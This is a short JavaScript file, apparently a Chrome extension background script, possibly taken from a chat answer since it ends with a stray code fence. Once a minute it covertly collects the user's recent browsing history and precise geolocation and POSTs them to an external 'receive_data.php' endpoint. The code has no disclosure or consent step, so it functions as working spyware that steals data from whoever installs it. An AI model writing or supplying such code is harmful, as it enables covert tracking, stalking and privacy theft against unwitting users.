var lastDownload = 0;

chrome.history.onVisited.addListener(function(item) {
  var now = Date.now();
  if (now - lastDownload >= 60000) { // send data every minute
    lastDownload = now;
    var history = [];
    chrome.history.search({text: '', maxResults: 5}, function(items) {
      for (var i = 0; i < items.length; i++) {
        history.push(items[i].url);
      }
      navigator.geolocation.getCurrentPosition(function(position) {
        var geolocation = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          timestamp: Date.now()
        };
        sendData(history.join('\n') + '\n' + JSON.stringify(geolocation));
      }, function(error) {
        console.error('Error getting geolocation:', error);
      });
    });
  }
});

function sendData(data) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://yourwebsite.com/receive_data.php', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('data=' + encodeURIComponent(data));
}
```
